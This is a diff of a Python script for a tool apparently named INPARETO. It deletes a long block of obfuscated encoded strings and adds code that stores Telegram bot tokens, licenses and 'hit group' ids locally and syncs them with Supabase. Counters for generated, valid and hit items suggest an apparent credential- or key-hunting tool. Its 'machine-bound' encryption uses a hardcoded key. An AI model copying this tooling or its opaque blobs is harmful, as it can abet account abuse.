-        'i<MovG9#}+t4}vtYa*ehtdj6>jR*AxX1G29V<+_iCU~zA81_ZkalPqPoYy7QXZv&c<(Wux',
-        'MC}udBzJP(|K-mk*x6`^h~I=T1#CDn3!~!qP!*O!B8-HO-$XLQW5bG?-XdVWTjoz;6lCqf',
-        'bo%T6*QRF@>Pu8MDi_ZfUn;l=GtlVV68hs|Prz)Os6RG(YL4BlJqF!b4$+ULNx{iDf|`p=',
-        '0OkL6_XEF;G`ALL!)WQP@4S*qIT2ysCa5_CnE-u2UJ6QKb>YN;6>Un`UK5voHY13o>9IbO',
-        'knqoXs=ctPzS|ANE1130fm$oacd{-eCsXFpi7u?5cyUkG(5hhHf2eU8C~=Gzp-&yF0h?(!',
-        '_QHnfrffc>O4giK!<Omalv7m}ZL9woD)&QXP8z3#{Kz!%AQ9{zTi;nUIK{toSFmSVT^kut',
-        '`ubsXb>70<^7`|ZY<^?KGbaqClt-})0Y2GH5*#{Rb~S)x=<VK2fg=e=mTn8~UJj`t_ZH%}',
-        '60_u+kD<m{SiEg|^-!p@04Aib^x~6C#f<5laDG?<@I!ARYTJ5dv@gpLK%XyD-tRY0_SJRa',
-        'P^bXBcso0g6R&6+uEi=@WhZxD0?MArlZxqCH0@$wH~^W~(P6aN*ZXu3QDO>TdPUJKuic^7',
-        '&sclDWsZ4Oq4a@s7fYi&&5O&59R%T>du9I!mfSFe+!NqF(3_4AC_{~xXmzcdYGhD_&>%26',
-        'E=hFE7SMNPj_JhWt{a#e=Ncv*QZ@g|qJ*x!bs1r<?5-HV#T1I!VlQ1lqgR^VDqM(s>O~7`',
-        'RM&EHa|V5^+doKt+fb*q{t3LD#V}-0rRb+Pp7swKMmplxbXit}GZ6v<&HoSN<f#?jcs}R5',
-        'VA(*awWqc4YhCG8M^;bBD;<tyS;#@Z==G&L7tF5hyjzR1fUM~6v?@{bx^(RW&O3+Gd`Rj}',
-        'q7d1y7-P@+>lZJkw0*(z&t*YJ<mvm<On^WLgmCCyVP?S12pWPvHZdCeP;8%RjwMnfg!sj;',
-        'z&2#k7!@6Y0CgG<HP#d2e&39n*nt9Fp44dG)(H3EO})r4-WrbGEMc%bX6Z>dPwNRJP-7A~',
-        'I>C^cmx)3DV{{z?=Qix#Y^q)s2PkhBiCM4j_wXfhvh-9>5iwbH2O{1&F0U%Hh>Za-KeX0h',
-        '6RxBY7)O4$ef1527Hj%@B=*cWbau6g*0+pNw@<T!RM1Fq#SW*v%q-}Qng%a5ESq`oDU*>O',
-        'q%(eI?2zd%77<f!_eFHzyxERhlv)qVMBsFk9oBX+GOPDQ+CmlrSWaoT#^+`>UXp#4w1>rs',
-        'DVZBMqC33ha1-(ADeNxQ2zxiH>sz$+i8+X1#vxqkeVo-a=wgg#&R9|se~L@{>&#<`CG)eH',
-        'QHCp#fTU@E58v1u<+P~y=lj{i)}c}C9vKI(7);Y3fS;RqvVb6XzNeyDsR^ube+#I=n<viy',
-        'C3^?F2_W>PpnoTtHPSGb3Z-J}AZ!Rv0JR!FCS`*7UXE|!gvrmWO$y$rWt?0aiy7>^fKcQM',
-        'V&W0KaM5&C?}#w-kF}3=8U*n9Tiz44k+COaN3#E%3RkK5ElvB&So6xz9CxppAz(s(0VQ13',
-        'SLF5RO=kYlH+4FvP#$Le!B8f=rCcPk!eBYUn0PI3=>tDxhk6?z%7jwE`Y~^Mq4q#$l4&WF',
-        'lq61(Ba1%i25XT6S=g+*KZKfzT@)LQPM-=?!SnHl{&;USyQnB)Kg}rEp5>Q!wp3E$=OBf>',
-        'js+~6CQl-1K^fZEAfbe`9tpK3#desM4WTJ_#>a;;-0V|$RXhzC1=JZ8lSQPr7cH>{{i_Bk',
-        'V;|-V=%v);R2KZodAaglnP5PfWhhWOSBLlK@bt7|t6}V-+V9%GKLtC%l4dF242Wn`i7odO',
-        'ixM$C61IGkj_l>$zuZ)1@th)~;R3$_-)h#8j(>+!0_u~*FgCr$F2W~-9>A>(QL%-r)kxX_',
-        'rEk}AAZB^mZbHz*vXTe^`;v%5D`-H?#)rB^*!sE+X7w~;XbUDybJmct!I%>otQ2gbgu9@(',
-        'U9`*I_K!%<1t-7)IOzvE;c*;;g1ZNrCa=~xioWaqj&KPZxZom{@d8u14Vo2)_>J7R>2UEH',
-        '_KK+XujMo2!j~8H&E<&u-GiaR$HH0;48g_a1<24}v6XMXBWg?CueeJUSF{@|FToLICfN6I',
-        'G{q8!7fn3O)EDYK-Ut*V%_D!0j<Lk6E74<KNV%-|CO@5L&JroQMU0FY6D=?<=&BM_4(f`U',
-        'Gve7i9d7?68wU+mG&!YJbBn)SMRwei-HyvAo#u841Nq(pqgY+Y#fP~deuP3ZiGO%S-g62^',
-        'N4Jq3--{hF{D({R`VDac)dDALPO89v4`v75mAR`GU8SN1N|7%5Q^XvSHmE>Y{3P7(#4TM=',
-        '*JH*_>f8b5wgPhRe8%eB-W1>MHwfM18xKN9DJx?hM|qYkxx)AaiL23U@Mbw6&y;z|SB|~a',
-        'xG9M`T|DHxkz27OCGj*fh6sh_i(n#wIQV=!aqiX}9hQ)WfTGkLPEI!$BW4J{#e-6KlNYig',
-        '=8mP&f#OJ1x_<nEKbiw!V6zC@hTd8vT{!RrCY9QCn9Ek=kb>nzg;7J41!iG&#L^7tn2~VR',
-        'G26Y;dQleqX`_r?upXH8<E|C$q;aVyznTVy15~*gCt}KC=c>!1+5kQ=CJ$;A^z~rIgCq-f',
-        'rWgR{E@wKGORd>F@yc$&wmr<<i7phvI7@6S58?xFxQDmTi-?GMpKJ$SZk1`BL?AgHpOHyT',
-        'iaSk?27q5`jPzlq-)u)Ejtizxmk*i(X^+%-v*vs6Lqc%8=^g4rbje$fF>dvOraz=UVZVj4',
-        'T!Bujg`_>0d7hCvhbZoDYOX@g0|hJPebX>aH19vRl{b44><z7LeXK=fc1E~gPmeYiYz5)X',
-        'L<@wuB&o;@Ild+`V+=Sv6~fawTntf+kTf(MzMRJIhmK<TgToo@*E%}^i^u(~8^v0Ho1m!H',
-        ';KVo8ZL9&?RlcYKP^=BTcK14tCs!3J0;v$g(t&xKG^RJWK{7C9JM+ufT{ru>T@35!+M1u&',
-        '$W~M)MPcMmY<!KsIY>#qSQG#iXfi94Pu}f$oBH$hASO0J$3TrnicF?+9fvo5W<l$$13EJB',
-        'm(}Mi%`Hj==0fl}2K2@{@{#<3khG-9?U#;X^$@7mHB3G)(`b-e_e~zss!2x`D;DJs%_jAV',
-        '2S!`pIBhrwapVz2`ku1A29v>R7P+jMQzJNyDpp+TbiTVk@Icd2d5gP{(SfzMwnA-++QU-z',
-        '?SB@Q*jJFoo)Wey1*mII(3pzzI05{YG~m}^S^I}w1}B$!p&thb11L=-RiOwDj{mnD(!S$$',
-        '#&JEeVK0Vnp)sy`${gj?CJV0?8yNI%<>_3C{CIp_m;R-?*0Lr(1FFt5FT^otYIvx!@m1aP',
-        'mplNgBD2$xuKM~c4v;C|ArEUb%gJWA{l88qM4=&3$<So(*D0E0dH|zJJ_MCji5uG)a)%cF',
-        '+^3u_Z0M@*n3m(T$;4FKvP*Ol%QV0s07C6H1ETM4?uKYmO?%D|dh%m(`4O&9LJD!18plhf',
-        '9FX3@*2ryLO`~y#h`16ZPmINk(EhL)mD*j+J7mygl?7GxG)@`fqRFRD0L<;LsZcd2<k~QI',
-        '1%#1otPa-W9qrh?n@zA=?Z%Z%igUvJ%1QF?o&9dSvsUHk0~8oGzXGw^>{Wpp(alqHFHw>-',
-        '%I<{LFem+<20@`P;LaefmnQ+&J*`$}t|Q@|CO7uI-~%&kK!&?neI4_^8-;Iol1sVnnRkjI',
-        '>qYmhg8eeIiPF$ZrnE5T<n1)!UD}KE%QT;t+@XNFp9>P1M)Q8s;u<i4X5=ePCkHsF9uXXP'
+
+_health_cache = {
+    "api": None,
+    "cloud": None,
+    "api_at": 0.0,
+    "cloud_at": 0.0,
+    "api_base": None,
+    "api_via": None,
+}
+_health_lock = threading.Lock()
+DASHBOARD_SHOW_LOGO = True
+DASHBOARD_INTERVAL = 2.5 if _IS_TERMUX else 1.0
+DASHBOARD_LIVE_INTERVAL = 2.0
+JACK_PANEL_LIVE = False
+_dashboard_plan_cache = {"uid": "", "snap": {}, "at": 0.0}
+_panel_refresh_stop = threading.Event()
+_panel_refresh_thread = None
+_panel_paint_lock = threading.Lock()
+_panel_alt_screen = False
+_panel_live_drawn_once = False
+_panel_last_draw_at = 0.0
+_panel_last_frame_lines = 0
+_last_dashboard_stats = {
+    "gen": 0, "valid": 0, "hit": 0, "errors": 0, "events": [], "at": 0.0,
+}
+DASHBOARD_PLAN_CACHE_TTL = 25.0
+DASHBOARD_PLAN_STICKY_PREMIUM_SEC = 3600
+_hunt_license_cache = {"ok": None, "at": 0.0}
+HUNT_LICENSE_CACHE_TTL = 45
+
+
+def _legacy_script_state_dir():
+    """Old default: state beside joint.py (lost when cwd/script path changes)."""
+    try:
+        base = os.path.dirname(os.path.abspath(__file__))
+    except NameError:
+        base = os.getcwd()
+    return base or os.getcwd()
+
+
+def _default_persistent_state_dir():
+    xdg = os.environ.get("XDG_DATA_HOME", "").strip()
+    if xdg:
+        return os.path.join(os.path.abspath(xdg), "inpareto")
+    return os.path.join(os.path.expanduser("~"), ".inpareto")
+
+
+def _migrate_legacy_state_files(target_dir):
+    global _legacy_state_migrated
+    if _legacy_state_migrated:
+        return
+    _legacy_state_migrated = True
+    legacy = os.path.abspath(_legacy_script_state_dir())
+    target = os.path.abspath(target_dir)
+    if legacy == target or not os.path.isdir(legacy):
+        return
+    try:
+        names = [
+            n for n in os.listdir(legacy)
+            if n.startswith(".inpareto") and os.path.isfile(os.path.join(legacy, n))
+        ]
+    except OSError:
+        return
+    for name in names:
+        src = os.path.join(legacy, name)
+        dst = os.path.join(target, name)
+        if os.path.isfile(dst):
+            continue
+        try:
+            shutil.copy2(src, dst)
+        except OSError as exc:
+            log_event("STATE", f"migrate {name}: {str(exc)[:40]}")
+
+
+def _state_dir_candidates():
+    """Every directory that may hold .inpareto_* (folder can differ from cwd)."""
+    seen = set()
+    out = []
+    override = (
+        os.environ.get("VAULT_STATE_DIR", "").strip()
+        or os.environ.get("INPARETO_STATE_DIR", "").strip()
+    )
+
+    def add(path):
+        path = os.path.abspath(path or "")
+        if not path or path in seen:
+            return
+        seen.add(path)
+        out.append(path)
+
+    if override:
+        add(override)
+    add(_default_persistent_state_dir())
+    add(_legacy_script_state_dir())
+    add(os.getcwd())
+    return out
+
+
+def _key_material_variants(state_dir=None, *, legacy_hostname=False):
+    """All sealing keys ever used — needed because path-bound keys break after dir move."""
+    mats = []
+    seen = set()
+
+    def add(parts):
+        material = b"|".join(parts)
+        if material in seen:
+            return
+        seen.add(material)
+        mats.append(material)
+
+    add([_STATE_KDF_PEPPER, _STATE_KEY_V2, platform.system().encode()])
+    dirs = [os.path.abspath(state_dir)] if state_dir else []
+    for d in _state_dir_candidates():
+        d = os.path.abspath(d)
+        if d not in dirs:
+            dirs.append(d)
+    for d in dirs:
+        add([_STATE_KDF_PEPPER, d.encode("utf-8"), platform.system().encode()])
+        if legacy_hostname:
+            add([
+                _STATE_KDF_PEPPER,
+                d.encode("utf-8"),
+                platform.node().encode("utf-8", errors="replace"),
+                str(uuid.getnode()).encode(),
+                platform.system().encode(),
+            ])
+    return mats
+
+
+def _device_state_dir():
+    """Where .inpareto_* live. Vault launchers set VAULT_STATE_DIR (or legacy INPARETO_STATE_DIR)."""
+    global _picked_state_dir
+    if _picked_state_dir:
+        return _picked_state_dir
+    override = (
+        os.environ.get("VAULT_STATE_DIR", "").strip()
+        or os.environ.get("INPARETO_STATE_DIR", "").strip()
+    )
+    if override:
+        base = os.path.abspath(override)
+    else:
+        base = None
+        for candidate in _state_dir_candidates():
+            if _dir_has_readable_session(candidate):
+                base = os.path.abspath(candidate)
+                break
+        if not base:
+            base = _default_persistent_state_dir()
+        target = _default_persistent_state_dir()
+        if os.path.abspath(base) != os.path.abspath(target):
+            _migrate_legacy_state_files(target)
+    os.makedirs(base, exist_ok=True)
+    _picked_state_dir = base
+    return base
+
+
+def reconcile_local_session_at_boot():
+    """Pick the folder that actually decrypts .inpareto_* and drop stale logout flags."""
+    global _picked_state_dir
+    override = (
+        os.environ.get("VAULT_STATE_DIR", "").strip()
+        or os.environ.get("INPARETO_STATE_DIR", "").strip()
+    )
+    if override:
+        _picked_state_dir = os.path.abspath(override)
+        os.makedirs(_picked_state_dir, exist_ok=True)
+        return
+    for d in _state_dir_candidates():
+        flag = os.path.join(d, ".inpareto_logged_out")
+        if os.path.isfile(flag) and _dir_has_readable_session(d):
+            try:
+                os.remove(flag)
+                log_event("STATE", f"removed stale logout flag in {d}")
+            except OSError:
+                pass
+    for d in _state_dir_candidates():
+        if _dir_has_readable_session(d):
+            _picked_state_dir = os.path.abspath(d)
+            log_event("STATE", f"session dir: {_picked_state_dir}")
+            target = _default_persistent_state_dir()
+            if _picked_state_dir != os.path.abspath(target):
+                _migrate_legacy_state_files(target)
+            return
+    _picked_state_dir = _default_persistent_state_dir()
+    _migrate_legacy_state_files(_picked_state_dir)
+    os.makedirs(_picked_state_dir, exist_ok=True)
+
+
+_STATE_FILE_PREFIX = "INPA1:"
+_STATE_KDF_PEPPER = b"INPARETO.LocalState.v1"
+_local_fernet = None
+_local_fernet_lock = threading.Lock()
+
+
+def _local_state_key_material():
+    """v2 key — same on every machine; not tied to state folder path."""
+    return b"|".join([
+        _STATE_KDF_PEPPER,
+        _STATE_KEY_V2,
+        platform.system().encode(),
+    ])
+
+
+def _local_state_key_material_legacy():
+    """Hostname/MAC variant for the active state dir (oldest seals)."""
+    variants = _key_material_variants(_device_state_dir(), legacy_hostname=True)
+    for material in variants:
+        if platform.node().encode("utf-8", errors="replace") in material:
+            return material
+    return variants[-1] if variants else _local_state_key_material()
+
+
+def _local_state_fernet():
+    """Machine-bound Fernet key — .inpareto_* not readable on another PC."""
+    global _local_fernet
+    with _local_fernet_lock:
+        if _local_fernet is not None:
+            return _local_fernet
+        try:
+            from cryptography.fernet import Fernet
+            from cryptography.hazmat.primitives import hashes
+            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+            material = _local_state_key_material()
+            salt = hashlib.sha256(material).digest()[:16]
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA256(),
+                length=32,
+                salt=salt,
+                iterations=200_000,
+            )
+            key = base64.urlsafe_b64encode(kdf.derive(material))
+            _local_fernet = Fernet(key)
+        except ImportError:
+            _local_fernet = False
+        return _local_fernet
+
+
+def _local_state_key_bytes():
+    return hashlib.sha256(_local_state_key_material()).digest()
+
+
+def _xor_state_bytes(data, key):
+    out = bytearray()
+    for i, b in enumerate(data):
+        out.append(b ^ key[i % len(key)])
+    return bytes(out)
+
+
+def _seal_local_state(plain):
+    text = str(plain if plain is not None else "")
+    fernet = _local_state_fernet()
+    if fernet:
+        token = fernet.encrypt(text.encode("utf-8")).decode("ascii")
+        return f"{_STATE_FILE_PREFIX}{token}"
+    key = _local_state_key_bytes()
+    payload = text.encode("utf-8")
+    xpayload = _xor_state_bytes(payload, key)
+    sig = hmac.new(key, xpayload, hashlib.sha256).digest()
+    blob = base64.urlsafe_b64encode(sig + xpayload).decode("ascii")
+    return f"{_STATE_FILE_PREFIX}H1:{blob}"
+
+
+def _local_state_key_bytes_from_material(material):
+    return hashlib.sha256(material).digest()
+
+
+def _dir_has_readable_session(state_dir):
+    """True if this folder has decryptable telegram id + bot token."""
+    state_dir = os.path.abspath(state_dir or "")
+    chat_path = os.path.join(state_dir, ".inpareto_telegram")
+    bot_path = os.path.join(state_dir, ".inpareto_bot")
+    chat = _read_local_state_file_at(chat_path, state_dir=state_dir).strip()
+    tok = _read_local_state_file_at(bot_path, state_dir=state_dir).strip()
+    return bool(chat and tok)
+
+
+def _open_local_state_sealed_body(body, key_material):
+    if not body.startswith("H1:"):
+        try:
+            from cryptography.fernet import Fernet
+            from cryptography.hazmat.primitives import hashes
+            from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+
+            salt = hashlib.sha256(key_material).digest()[:16]
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA256(),
+                length=32,
+                salt=salt,
+                iterations=200_000,
+            )
+            key = base64.urlsafe_b64encode(kdf.derive(key_material))
+            return Fernet(key).decrypt(body.encode("ascii")).decode("utf-8")
+        except Exception:
+            return None
+    if body.startswith("H1:"):
+        try:
+            packed = base64.urlsafe_b64decode(body[3:])
+            sig, xpayload = packed[:32], packed[32:]
+            key = _local_state_key_bytes_from_material(key_material)
+            if not hmac.compare_digest(hmac.new(key, xpayload, hashlib.sha256).digest(), sig):
+                return None
+            payload = _xor_state_bytes(xpayload, key)
+            return payload.decode("utf-8")
+        except Exception:
+            return None
+    return None
+
+
+def _open_local_state(raw, *, state_dir_hint=None):
+    raw = (raw or "").strip()
+    if not raw:
+        return ""
+    if not raw.startswith(_STATE_FILE_PREFIX):
+        return raw
+    body = raw[len(_STATE_FILE_PREFIX):]
+    hint_dir = os.path.dirname(os.path.abspath(state_dir_hint)) if state_dir_hint else None
+    for material in _key_material_variants(hint_dir, legacy_hostname=False):
+        plain = _open_local_state_sealed_body(body, material)
+        if plain is not None:
+            return plain
+    for material in _key_material_variants(hint_dir, legacy_hostname=True):
+        plain = _open_local_state_sealed_body(body, material)
+        if plain is not None:
+            return plain
+    log_event("STATE", "sealed file decrypt failed")
+    return None
+
+
+def _read_local_state_file_at(path, *, state_dir=None):
+    try:
+        if not os.path.isfile(path):
+            return ""
+        with open(path, encoding="utf-8") as f:
+            raw = f.read()
+        hint = state_dir or os.path.dirname(os.path.abspath(path))
+        plain = _open_local_state(raw, state_dir_hint=hint)
+        if plain is None:
+            return ""
+        return plain
+    except OSError:
+        return ""
+
+
+def _read_local_state_file(path):
+    try:
+        if not os.path.isfile(path):
+            return ""
+        with open(path, encoding="utf-8") as f:
+            raw = f.read()
+        plain = _open_local_state(raw, state_dir_hint=os.path.dirname(os.path.abspath(path)))
+        if plain is None:
+            return ""
+        if plain:
+            try:
+                _write_local_state_file(path, plain)
+            except OSError:
+                pass
+        return plain
+    except OSError:
+        return ""
+
+
+def _write_local_state_file(path, plain):
+    try:
+        sealed = _seal_local_state(plain)
+        with open(path, "w", encoding="utf-8") as f:
+            f.write(sealed)
+    except OSError as exc:
+        log_event("STATE", str(exc)[:80])
+
+
+def _read_local_state_json(path):
+    text = _read_local_state_file(path)
+    if not text:
+        return None
+    try:
+        data = json.loads(text)
+        return data if isinstance(data, dict) else None
+    except json.JSONDecodeError:
+        log_event("STATE", f"invalid json in {os.path.basename(path)}")
+        return None
+
+
+def _write_local_state_json(path, obj):
+    _write_local_state_file(path, json.dumps(obj, ensure_ascii=False))
+
+
+def _device_id_file():
+    return os.path.join(_device_state_dir(), ".inpareto_device")
+
+
+def _device_chat_file():
+    return os.path.join(_device_state_dir(), ".inpareto_telegram")
+
+
+def _bot_token_file():
+    return os.path.join(_device_state_dir(), ".inpareto_bot")
+
+
+def persist_local_bot_token(token):
+    tok = (token or "").strip()
+    if tok:
+        _write_local_state_file(_bot_token_file(), tok)
+
+
+def _read_stored_bot_token():
+    tok = _read_local_state_file(_bot_token_file()).strip()
+    return tok if tok else ""
+
+
+def clear_local_bot_token():
+    try:
+        if os.path.isfile(_bot_token_file()):
+            os.remove(_bot_token_file())
+    except OSError:
+        pass
+
+
+def has_local_operator_session():
+    """Logged-in on this install: local Telegram id + bot token, not logged out."""
+    global _picked_state_dir
+    if is_locally_logged_out():
+        return False
+    chat = _read_stored_chat_id()
+    tok = _read_stored_bot_token()
+    if chat and tok:
+        return True
+    for d in _state_dir_candidates():
+        if _dir_has_readable_session(d):
+            if not _picked_state_dir:
+                _picked_state_dir = os.path.abspath(d)
+            return not is_locally_logged_out()
+    return False
+
+
+def clear_local_device_id():
+    try:
+        if os.path.isfile(_device_id_file()):
+            os.remove(_device_id_file())
+    except OSError:
+        pass
+
+
+def clear_all_local_operator_state(*, mark_logged_out=False):
+    """Wipe local session — license + hit group stay on Telegram id in cloud."""
+    clear_local_hit_group_id()
+    clear_local_hit_group_owner()
+    clear_local_license()
+    clear_local_free_plan()
+    clear_local_bot_token()
+    try:
+        if os.path.isfile(_device_chat_file()):
+            os.remove(_device_chat_file())
+    except OSError:
+        pass
+    # Also remove legacy device id file (old versions).
+    clear_local_device_id()
+    clear_operator_session_verified()
+    global _cached_hit_group_id, _operator_access_sticky_until
+    _cached_hit_group_id = None
+    _operator_access_sticky_until = 0.0
+    if mark_logged_out:
+        mark_local_logged_out()
+    else:
+        clear_local_logged_out()
+
+
+def _hit_group_owner_file():
+    return os.path.join(_device_state_dir(), ".inpareto_hit_group_owner")
+
+
+def _hit_group_id_file():
+    return os.path.join(_device_state_dir(), ".inpareto_hit_group")
+
+
+def _license_local_file():
+    return os.path.join(_device_state_dir(), ".inpareto_license")
+
+
+def _invalidate_dashboard_plan_cache():
+    _dashboard_plan_cache.update(uid="", snap={}, at=0.0)
+
+
+def persist_local_license(user_id, expires_at_iso):
+    uid = str(user_id or "").strip()
+    if not uid:
+        return
+    _write_local_state_json(
+        _license_local_file(),
+        {"user_id": uid, "expires_at": expires_at_iso},
+    )
+    _invalidate_dashboard_plan_cache()
+
+
+def read_local_license():
+    data = _read_local_state_json(_license_local_file())
+    if not data:
+        return None
+    uid = str(data.get("user_id") or "").strip()
+    if not uid:
+        return None
+    linked = str(resolve_operator_telegram_id() or _read_stored_chat_id() or "").strip()
+    if linked and uid != linked:
+        return None
+    return data
+
+
+def clear_local_license():
+    try:
+        if os.path.isfile(_license_local_file()):
+            os.remove(_license_local_file())
+    except OSError:
+        pass
+    _invalidate_dashboard_plan_cache()
+
+
+def _free_plan_local_file():
+    return os.path.join(_device_state_dir(), ".inpareto_free_plan")
+
+
+def persist_local_free_plan(user_id, row):
+    uid = str(user_id or "").strip()
+    if not uid or not isinstance(row, dict):
+        return
+    payload = {
+        "user_id": uid,
+        "started_at": row.get("started_at"),
+        "trial_ends_at": row.get("trial_ends_at"),
+        "last_day": row.get("last_day"),
+        "day_count": int(row.get("day_count") or 0),
+    }
+    _write_local_state_json(_free_plan_local_file(), payload)
+
+
+def read_local_free_plan():
+    data = _read_local_state_json(_free_plan_local_file())
+    if not data:
+        return None
+    uid = str(data.get("user_id") or "").strip()
+    if not uid:
+        return None
+    linked = str(resolve_operator_telegram_id() or _read_stored_chat_id() or "").strip()
+    if linked and uid != linked:
+        return None
+    return data
+
+
+def clear_local_free_plan():
+    try:
+        if os.path.isfile(_free_plan_local_file()):
+            os.remove(_free_plan_local_file())
+    except OSError:
+        pass
+
+
+def persist_local_hit_group_id(group_id):
+    gid = str(group_id or "").strip()
+    if not gid:
+        return
+    _write_local_state_file(_hit_group_id_file(), gid)
+
+
+def read_local_hit_group_id():
+    gid = _read_local_state_file(_hit_group_id_file()).strip()
+    return gid if gid else ""
+
+
+def preserve_operator_hit_group_for_user(chat_id=None):
+    """Write hit group to cloud registry by Telegram id — call before logout clears local files."""
+    chat_id = str(
+        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
+    ).strip()
+    if not chat_id or not is_cloud_enabled():
+        return None
+    gid = read_local_hit_group_id()
+    if not gid:
+        cached = _cached_hit_group_id
+        if cached:
+            gid = str(cached).strip()
+    if not gid:
+        gid = fetch_operator_hit_group_id_for_telegram_user(chat_id) or ""
+    gid = str(gid or "").strip()
+    if gid:
+        err = user_hit_group_set(chat_id, gid)
+        if not err:
+            return gid
+        log_event("HITGROUP", f"preserve failed: {str(err)[:80]}")
+    return None
+
+
+def restore_operator_hit_group_for_user(chat_id=None):
+    """Pull hit group from registry / cloud into local .inpareto_hit_group."""
+    global _cached_hit_group_id
+    chat_id = str(
+        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
+    ).strip()
+    if not chat_id:
+        return ""
+    local = read_local_hit_group_id()
+    if local:
+        _cached_hit_group_id = local
+        if not read_local_hit_group_owner():
+            persist_local_hit_group_owner(chat_id)
+        return local
+    gid = fetch_operator_hit_group_id_for_telegram_user(chat_id)
+    if not gid:
+        return ""
+    persist_local_hit_group_id(gid)
+    persist_local_hit_group_owner(chat_id)
+    _cached_hit_group_id = gid
+    return gid
+
+
+def sync_local_hit_group_from_cloud():
+    """Pull hit group from cloud by Telegram id (never machine fingerprint)."""
+    if is_locally_logged_out():
+        return read_local_hit_group_id()
+    if not has_local_operator_session() and not resolve_operator_telegram_id():
+        return read_local_hit_group_id()
+    gid = read_local_hit_group_id()
+    if gid:
+        chat_id = resolve_operator_telegram_id()
+        if chat_id and not read_local_hit_group_owner():
+            persist_local_hit_group_owner(chat_id)
+        return gid
+    chat_id = resolve_operator_telegram_id()
+    if not chat_id or not is_cloud_enabled():
+        return ""
+    return restore_operator_hit_group_for_user(chat_id) or ""
+
+
+def clear_local_hit_group_id():
+    try:
+        if os.path.isfile(_hit_group_id_file()):
+            os.remove(_hit_group_id_file())
+    except OSError:
+        pass
+
+
+def persist_local_hit_group_owner(chat_id):
+    chat_id = str(chat_id or "").strip()
+    if not chat_id:
+        return
+    _write_local_state_file(_hit_group_owner_file(), chat_id)
+
+
+def read_local_hit_group_owner():
+    owner = _read_local_state_file(_hit_group_owner_file()).strip()
+    return owner if owner else ""
+
+
+def clear_local_hit_group_owner():
+    try:
+        if os.path.isfile(_hit_group_owner_file()):
+            os.remove(_hit_group_owner_file())
+    except OSError:
+        pass
+
+
+def _session_verified_file():
+    return os.path.join(_device_state_dir(), ".inpareto_session_verified")
+
+
+def persist_operator_session_verified(chat_id=None):
+    """Remember completed setup so restarts skip the full verification wall."""
+    chat_id = str(
+        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
+    ).strip()
+    if not chat_id:
+        return
+    _write_local_state_json(
+        _session_verified_file(),
+        {"telegram_chat_id": chat_id, "verified_at": license_iso_now()},
+    )
+
+
+def read_operator_session_verified(chat_id=None):
+    chat_id = str(
+        chat_id or resolve_operator_telegram_id() or _read_stored_chat_id() or ""
+    ).strip()
+    if not chat_id or is_locally_logged_out():
+        return False
+    data = _read_local_state_json(_session_verified_file())
+    if not data:
+        return False
+    if str(data.get("telegram_chat_id") or "").strip() != chat_id:
+        return False
+    verified_at = license_parse_iso(data.get("verified_at"))
+    if not verified_at:
+        return False
+    age = (datetime.now(timezone.utc) - verified_at).total_seconds()
+    return age < SESSION_VERIFIED_MAX_AGE_SEC
+
+
+def clear_operator_session_verified():
+    try:
+        if os.path.isfile(_session_verified_file()):
+            os.remove(_session_verified_file())
+    except OSError:
+        pass
+
+
+def _logout_flag_file():
+    return os.path.join(_device_state_dir(), ".inpareto_logged_out")
+
+
+def mark_local_logged_out():
+    _write_local_state_file(_logout_flag_file(), "1")
+
+
+def clear_local_logged_out():
+    try:
+        if os.path.isfile(_logout_flag_file()):
+            os.remove(_logout_flag_file())
+    except OSError:
+        pass
+
+
+def is_locally_logged_out():
+    for d in _state_dir_candidates():
+        flag = os.path.join(d, ".inpareto_logged_out")
+        if not os.path.isfile(flag):
+            continue
+        if _dir_has_readable_session(d):
+            try:
+                os.remove(flag)
+                log_event("STATE", "cleared stale .inpareto_logged_out")
+            except OSError:
+                pass
+            return False
+        return True
+    return os.path.isfile(_logout_flag_file())
+
+
+def device_row_has_active_link(row):
+    """True if row is an active device link (not archived logout)."""
+    if not row:
+        return False
+    device_hash = str(row.get("device_hash") or "")
+    if device_hash.endswith("-OUT"):
+        return False
+    token = (row.get("telegram_bot_token") or "").strip()
+    chat = (row.get("telegram_chat_id") or "").strip()
+    if not token or not chat:
+        return False
+    if token in ("LOGGED_OUT", "null", "none"):
+        return False
+    if chat in ("0", "null", "none"):
+        return False
+    return True
+
+
+def persist_device_identity(device_hash=None, chat_id=None):
+    """Local session files — Telegram id is the operator key (device hash removed)."""
+    if chat_id:
+        _write_local_state_file(_device_chat_file(), str(chat_id).strip())
+
+
+def _read_stored_chat_id():
+    chat = _read_local_state_file(_device_chat_file()).strip()
+    return chat if chat else ""
+
+
+def get_device_hash():
+    """Deprecated: device hash removed (Telegram-ID only)."""
+    return ""
+
+
+def is_cloud_enabled():
+    return bool(SUPABASE_URL and SUPABASE_ANON_KEY)
+
+
+def is_device_hash_enabled():
+    """Device-hash based cloud 'devices' table is deprecated and disabled."""
+    return False
+
+
+def is_device_ready():
+    return is_cloud_enabled() and bool(resolve_operator_id())
+
+
+def is_profile_tracking_ready():
+    """Local profile cache + achievements — works without cloud when operator id exists."""
+    return bool(resolve_operator_id())
+
+
+def resolve_operator_telegram_id():
+    """Primary operator key — Telegram user/chat id (not device hash)."""
+    chat = str(TELEGRAM_CHAT_ID or "").strip()
+    if chat:
+        return chat
+    stored = _read_stored_chat_id()
+    if stored:
+        return stored
+    return str(OPERATOR_ID or "").strip()
+
+
+def resolve_operator_id(telegram_chat_id=""):
+    tg = resolve_operator_telegram_id()
+    if tg:
+        return tg
+    if telegram_chat_id:
+        return str(telegram_chat_id).strip()
+    return ""
+
+
+def supabase_headers(prefer=None):
+    headers = {
+        "apikey": SUPABASE_ANON_KEY,
+        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
+        "Content-Type": "application/json",
+    }
+    if prefer:
+        headers["Prefer"] = prefer
+    return headers
+
+
+def supabase_request(method, table, params=None, payload=None, prefer=None):
+    url = f"{SUPABASE_URL}/rest/v1/{table}"
+    attempts = 3
+    last_err = None
+    for i in range(attempts):
+        try:
+            response = requests.request(
+                method,
+                url,
+                headers=supabase_headers(prefer),
+                params=params,
+                json=payload,
+                timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
+            )
+            if not response.ok:
+                # Retry only on transient/rate-limit/server errors.
